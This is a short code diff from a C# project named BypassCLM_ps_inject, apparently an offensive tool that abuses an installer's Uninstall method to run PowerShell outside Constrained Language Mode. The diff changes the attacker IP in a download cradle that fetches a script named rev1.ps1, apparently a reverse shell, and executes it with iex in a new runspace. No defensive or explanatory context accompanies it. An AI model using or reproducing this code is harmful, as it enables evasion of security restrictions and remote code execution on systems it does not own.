@@ -23,7 +23,7 @@ namespace BypassCLM_ps_inject
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
 
-            String cmd = "(New-Object Net.WebClient).DownloadString('http://10.10.15.160/out/ps1/rev1.ps1') | iex";
+            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.49.122/out/ps1/rev1.ps1') | iex";
 
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
